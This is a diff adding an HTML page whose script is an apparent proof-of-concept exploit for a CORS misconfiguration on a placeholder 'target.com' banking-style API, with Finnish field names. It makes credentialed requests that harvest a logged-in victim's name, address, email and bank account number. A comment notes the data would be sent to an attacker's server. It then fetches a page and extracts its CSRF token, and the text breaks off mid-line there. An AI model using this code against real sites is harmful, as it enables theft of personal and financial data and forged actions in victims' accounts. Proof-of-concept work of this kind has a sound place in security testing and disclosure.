@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<meta charset="UTF-8"> 
+<html>
+<body>
+<div id="demo">
+</div>
+
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+
+    //Let's make a variable called "parse"
+    var parse = JSON.parse(this.responseText);
+
+    //Parse the firstname and the lastname from the response
+    var nimi = parse.etunimi+" "+parse.sukunimi;
+
+    //Parse the address from the response
+    var osoite = parse.yhteystiedot.lahiosoite;
+
+    //Parse the email address from the response
+    var mail = parse.yhteystiedot.sahkopostiosoite;
+
+    //Parse the bank account from the response
+    var tili = parse.tilit[0].tilinumero;
+
+    //Let's make global variable called 'viesti' which we can write to the console – In the real life scenario this data would be sent to the attacker's server. Also, echo some content to the web page.
+    window.viesti = "Hei "+nimi+"<br>Osoitteesi on: "+osoite+"<br>Sähköpostiosoitteesi on: "+mail+"<br>Tilinumerosi on "+tili;
+    console.log(viesti);
+
+    //Small break and execute function called 'CSRF'    
+    setTimeout(CSRF, 500); 
+    }
+    else{
+    //This was to ensure that we can first trick the user to login and keep script running :)
+    setTimeout(cors, 5000);
+    }
+  };
+  xhttp.open("GET", "https://target.com/e2/target/api/asiakastiedot", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+//In the first place let's wait two seconds so we can trick victim to log in
+setTimeout(cors, 2000);
+
+
+function CSRF() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = xhttp.responseText;
+      function getMeta(metaName) {
+
+      //CSRF token was at meta tag so let's steal it.
+      const metas = document.getElementsByTagName('meta');
+      for (let i = 0; i < metas.length; i++) {
+            if (metas[i].getAttribute('name') === metaName) {
+          return metas[i].getAttribute('content');
+    }
+  }
+  return '';
+}   
+
+//Generate the global variable called 'token'. Which is basicly the value of the '_csrf' and write it to the console
+window.token=getMeta('_csrf');
+console.log("CSRF-token: "+token);
+    }
+  };
+  xhtt…
